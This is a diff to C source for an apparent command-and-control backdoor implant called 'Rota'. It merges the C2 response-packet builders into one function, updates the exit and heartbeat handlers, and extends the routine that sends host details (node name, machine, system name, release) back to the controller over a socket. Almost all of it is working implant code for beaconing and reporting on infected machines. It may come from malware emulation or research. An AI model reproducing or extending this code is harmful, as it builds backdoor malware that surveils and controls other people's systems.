@@ -20,10 +20,14 @@
 
 // https://gist.github.com/suyash/2488ff6996c98a8ee3a84fe3198a6f85
 
+unsigned char payloadLen[] = {0x0f};
+unsigned char keyLen[] = {0x00,0x00};
+unsigned char cmd_id[] = {0x00, 0x00, 0x00, 0x00};
+
 void c2_exit(char *cmd_id, int sock) {
 
     char *msg  = "exiting!";
-    build_c2_response(msg, cmd_id, sock);
+    build_c2_response(msg, strlen(msg), cmd_id, sock);
     shutdown(sock, 2);
     close(sock);
 
@@ -74,7 +78,7 @@ void c2_heartbeat(char *cmd_id, int sock) {
     printf("[+] Rota C2 heartbeat!\n");
     #endif
     char *buffer = "PING";
-    build_c2_response(buffer, cmd_id, sock);
+    build_c2_response(buffer, strlen(buffer), cmd_id, sock);
 }
 
 void c2_set_timeout(int *sleepTime, int newTime) {
@@ -102,8 +106,9 @@ void c2_upload_device_info(char *buffer) {
                 17);
     }
 
-    snprintf(buffer, 200, "%s-%s-%s",
+    snprintf(buffer, 260, "%s-%s-%s-%s",
              hostinfo.nodename,
+             hostinfo.machine,
              hostinfo.sysname,
              hostinfo.release);
 }
@@ -217,35 +222,8 @@ char *parse_c2_payload( char *buffer, int length) {
     return payload;
 }
 
-void build_c2_response(char *buffer, char *cmd_id, int sock){
-    char *rota_resp_pkt = initial_rota_pkt();
 
-    // correct length of payload on buffer
-    int buffer_len = strlen(buffer);
-
-    // bytes 4->8 session id
-    memcpy(&rota_resp_pkt[4], sessionId, sizeof(sessionId));
-
-    memcpy(&rota_resp_pkt[8], &buffer_len, 4);
-
-    // update cmd_id in response packet
-    memcpy(&rota_resp_pkt[14], cmd_id, 4);
-    // update cmd_id in response packet
-    memcpy(&rota_resp_pkt[19], marker_1, sizeof(marker_1));
-
-    // reallocate space from 82 byte header + response "body"
-    rota_resp_pkt = realloc(rota_resp_pkt, (82 + buffer_len));
-    // zero out new realloc'd data
-    memset(&rota_resp_pkt[82], 0, strlen(buffer));
-    memcpy(&rota_resp_pkt[82], buffer, buffer_len);
-
-    send(sock, rota_resp_pkt, (82 + buffer_len), 0);
-    free(rota_resp_pkt);
-    close(sock);
-}
-
-// TODO - clean up for one response function
-void build_c2_response2(char *buffer, int buffer_size, char *cmd_id, int sock){
+void build_c2_response(char *buffer, int buffer_size, char *cmd_id, int sock){
     char *rota_resp_pkt = initial_rota_pkt();
 
     // correct length of payload on buffer
@@ -270,5 +248,4 @@ void build_c2_response2(char *buffer, int buffer_size, char *cmd_id, int sock){
     send(sock, rota_resp_pkt, (82 + buffer_len), 0);
     free(rota_resp_pkt);
     close(sock);
-
 }
